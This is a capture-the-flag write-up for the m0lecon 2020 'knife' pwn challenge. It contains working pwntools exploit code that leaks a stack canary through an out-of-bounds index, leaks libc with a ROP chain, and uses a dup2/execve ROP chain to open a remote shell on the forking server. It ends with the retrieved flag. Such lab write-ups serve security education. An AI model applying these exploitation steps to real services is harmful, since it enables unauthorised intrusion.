---
ctf_name: "m0lecon 2020 Teaser"
title:	"knife"
date:	2020-05-24
category: "pwn"
author: "OrsoBruno96, NicolaVV"
---

## The challenge
ELF 64-bits binary that listens on tcp port waiting for connections. It is not clear what the program should do, but for sure it does not handle it correctly.

```bash
$   checksec knife
[*] '/home/orsobruno96/ctfs/m0lecon/knife'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```


## Bugs
- bound check for the command `LOAD <idx>`. This command lets you read variables on the stack indexed by `idx`. The check on `idx` is not done correctly, you can actually read negative indexes, canary included.
- buffer overflow in the main command. You have control over `rbp+0x8`.


## Exploitation

### Surfing bird
We all hate birds that hide on the stack. We first exploit an out of bound to leak the canary, that doesn't change after `fork()`.


```python
#!/usr/bin/env python3
from pwn import ELF, context, args, gdb, remote, process, log, \
    fit, p64, u64, flat, ui


def recv_bytes_cusu(off):
    if not (-19 < off < 8):
        raise ValueError("Cusu out of bound")
    io.sendline(f"LOAD {off}")
    res = io.recv().strip().ljust(8, b"\x00")
    return u64(res)


if __name__ == "__main__":
    io = start()
    # ui.pause()
    canary = recv_bytes_cusu(-13)
    io.close()

```


### Leaking libc address
Then we reconnect to leak the libc address, using a buffer overflow and a rop
chain. We use the fact that the file descriptor for the connection is always 4.
This is because `fork()` duplicates entirely the process, including the
file descriptor table.


To effectively leak the libc we can read the GOT with a rop chain and use
`sendlen(4, exe.sym.got['write'], size)` to read the answer. We cannot simply use
`puts` or `printf` because standard output is not bound to our connection.

The gadgets used for this rop chain can be found in the executable,
You can leak libc addresses more than once to [find](https://libc.blukat.me/) `libc6_2.27-3ubuntu1_amd64.deb`.

```nasm
    pop rdi ; POP_RDI 0x4014f3
    ret
    ; ...
    pop rsi ; POP_RSI_POP_R15 0x4014f1
    pop r15
    ret
    ; ...
    mov rdx, 0x20; MOV_RDX_20 0x401528
    ret

```



```python
def leak_libc_address(canary):
    payload = dict()
    payload[0] = b"EXIT "
    payload[ebp_8_off] = flat(
        p64(POP_RDI),
        p64(0x4),
        p64(POP_RSI_POP_R15),
        p64(exe.sym.got['write']),
        p64(0x101010101010),
        p64(MOV_RDX_20),
        p64(exe.sym.sendlen),
    )
    payload[canary_off] = p64(canary)
    prettify_shellcode(fit(payload))
    io.sendline(fit(payload))
    res = u64(io.recv()[:8].ljust(8, b"\x00"))
    log.info(f"write addr: {res:#08x}")
    libc.address = res - libc.sym.write
    log.info(f"libc addr: {libc.address:#08x}")
```



### Drop a shell
Now we connect a third time for the exploit. We know where libc is so
we can rop chain `execve("/bin/sh", 0, 0)`, but we have to bind stdin and stdout
to our socket. This is done via `dup2`,


```python
def execve(canary):
    """
    We want to build a rop to call the following
    C code:
    close(0);  // close stdin
    close(1);  // close stdout
    dup2(4, 0);  // bind stdin to socket
    dup2(4, 1);  // bind stout to socket
    execve("/bin/sh", 0, 0);  // pwn3d
    """
    # NOP are for stack alignment.
    rop = [
        POP_RDI, 0, NOP, libc.sym.close,
        POP_RDI, 1, NOP, libc.sym.close,
        POP_RDI, 4, libc.address + libc_POP_RSI, 0, libc.sym.dup2,
        POP_RDI, 4, libc.address + libc_POP_RSI, 1, libc.sym.dup2,
        POP_RDI, next(libc.search(b"/bin/sh")), libc.address + libc_POP_RSI,
        0, libc.address + libc_POP_RDX, 0, libc.sym.execve
    ]
    rop = b"".join(map(p64, rop))
    payload = dict()
    payload[0] = b"EXIT "
    payload[canary_off] = p64(canary)
    payload[ebp_8_off] = rop
    io.sendline(fit(payload))
```


## Pwning

```python
if __name__ == "__main__":
    io = start()
    # ui.pause()
    canary = recv_bytes_cusu(-13)
    io.close()
    io = start()
    # ui.pause()
    leak_libc_address(canary)
    io.close()
    io = start()
    ui.pause()
    execve(canary)
    io.interactive()
```


```bash
$   ./pwn_knife.py REMOTE
...
[*] write addr: 0x7fcd7d63c140
[*] libc addr: 0x7fcd7d52c000
[*] Switching to interactive mode
$  ls
chall
config.txt
flag.txt
$  cat flag.txt
ptm{f0rk5_ar3n7_g00d_f0r_cnr13s}
```
